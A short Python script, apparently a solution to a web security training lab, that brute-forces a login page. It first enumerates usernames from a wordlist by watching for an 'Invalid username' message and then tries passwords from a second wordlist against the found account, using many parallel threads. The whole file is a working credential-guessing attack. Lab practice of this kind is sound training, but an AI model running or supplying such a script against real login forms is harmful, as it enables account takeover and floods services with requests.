import requests
import threading

# Read username and password list
with open('username.txt', 'r') as file:
  usernames = [line.rstrip() for line in file]

with open('password.txt', 'r') as file:
  passwords = [line.rstrip() for line in file]

############################################################################

# URL LAB ID
url = 'https://0a1100e004edd9fc8185c640007100be.web-security-academy.net'

threads = []
username_ = ''
password_ = ''

def username_enum(username):
  data = { 'username' : username, 'password' : 'something' }
  response = requests.post(url = url + '/login', data = data)
  if 'Invalid username' not in response.text:
    global username_
    username_ = username

def find_password(username, password):
  data = { 'username' : username, 'password' : password }
  response = requests.post(url = url + '/login', data = data)
  if 'Incorrect password' not in response.text:
    global password_
    password_ = password

for i in range(len(usernames)):
  threads.append(threading.Thread(target=username_enum, args=(usernames[i],)))
  
for i in range(len(usernames)):
  threads[i].start()
  
for i in range(len(usernames)):
  threads[i].join()
  
print(username_)

threads = []
for i in range(len(passwords)):
  threads.append(threading.Thread(target=find_password, args=(username_,passwords[i],)))
  threads[i].start()

for i in range(len(passwords)):
  threads[i].join()
  
print(f'Credentials: {username_} - {password_}')